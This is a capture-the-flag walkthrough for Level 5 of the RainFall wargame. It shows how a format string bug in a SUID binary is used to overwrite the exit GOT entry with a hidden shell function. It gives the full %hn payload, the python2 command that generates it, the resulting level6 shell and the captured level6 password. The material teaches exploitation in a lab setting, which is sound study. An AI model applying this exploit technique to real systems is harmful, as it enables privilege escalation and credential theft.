# Walkthrough for Level 5

## Understanding the Binary

This binary is vulnerable to a format string attack. The `n` function passes user input directly to `printf` as a format
string instead of as plain text. This allows us to write to arbitrary memory locations. Additionally, there is a
function called `o` which is never called, but it spawns a shell. Since `level5` is a SUID binary owned by `level6`, the
resulting shell will run with the permissions of `level6`, allowing us to read their password. At the end of the `n`
function, there is a call to `exit`, a libc function. We will use a format string attack to overwrite the address of the
`exit` function in the Global Offset Table (GOT) with the address of the `o` function. As a result, when the program
calls `exit`, it will actually call the `o` function, spawning a shell.

## Getting the Address of the `o` function

```shell
┌──(kali㉿kali)-[~/rainfall/level5]
└─$ nm ./level5 | grep "T o"
080484a4 T o
```

Decomposing this address into two short integers, we get `0x0804` for the high-order bytes and `0x84a4` for the
low-order bytes.

## Getting the address of the `exit` libc function in the GOT

Using `ghidra` we get the exit function's address: `0x08049838`

Is also possible to get this address using `objdump`:
```shell
level5@RainFall:~$ objdump -R ./level5 | grep " exit"
08049838 R_386_JUMP_SLOT   exit
```

As in the previous level, instead of writing a long integer (4 bytes), we’ll write two short integers (2 bytes each).
To do that, we’ll use the specifier: `%hn`.

We want to write 0x080484a4. This means 0x0804 (2052 in decimal) in the high-order bytes and 0x84a4 (33956 in decimal)
in the low-order bytes.

We want to write these values at address 0x08049838: 0x84a4 (the lower two bytes) at 0x08049838, and 0x0804 (the higher
two bytes) at 0x0804983a (which is 0x08049838 + 2).

In little-endian, this address becomes `\x38\x98\x04\x08` for the lower two bytes and `\x3a\x98\x04\x08` for the higher
two bytes. Or concatenated in `\x38\x98\x04\x08\x3a\x98\x04\x08`

## Determining the position of our argument on the Stack

To determine the position of our argument on the stack, we can run the binary with a format string that prints several
values from the stack

```shell
level5@RainFall:~$ ./level5 
AAAA.%p.%p.%p.%p.%p
AAAA.0x200.0xb7fd1ac0.0xb7ff37d0.0x41414141.0x2e70252e
```

We can see that the 4th argument on the stack is 0x41414141 (which corresponds to AAAA in hexadecimal), so we will use 4
as our starting positional parameter: `%4$n`. Based on the previous step, we need two positional parameters: %4$hn for
the lower-order bytes and %5$hn for the higher-order bytes.

## Padding the format string

`AAAA%96x%4$n` will write the value 100 at the address 0x41414141. The `%96x` specifier will pad the output with 96
characters, resulting in a total of 100 characters printed (four from AAAA and 96 from the padding).

## Crafting the Exploit

The resulting exploit is: `\x38\x98\x04\x08\x3a\x98\x04\x08%2044x%5$hn%31904x%4$hn`

- \x38\x98\x04\x08 or 0x08049838 (in reverse order) points to the high order bytes.
- \x3a\x98\x04\x08 or 0x0804983a (in reverse order) points to the low order bytes.
- %2044x will write 2044 bytes on the standard output.
- %5$hn will write 8 + 2044 = 2052 bytes (or 0x0804) at the second address specified (0x0804983a).
- %31904x will write 31904 bytes on the standard output. 
- %4$hn will write 8 + 2044 + 31904 = 33956 (or 0x84A4) at the first address specified (0x08049838).

We use Python to generate the exploit and save it to a file:
```shell
python2 -c 'print "\x38\x98\x04\x08\x3a\x98\x04\x08%2044x%5$hn%31904x%4$hn"' > /tmp/exploit5
```

## Running the Exploit

We use the `cat` command with the `-` option because we need to keep an interactive shell open to control the shell
spawned by the `o` function.

```shell
level5@RainFall:~$ cat /tmp/exploit5 - | ./level5
8: 200 ... SNIP... b7fd1ac0
...SNIP... 
whoami
level6
```

## Reading the Password

```shell
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

We can now log in as `level6` using the password we just found.
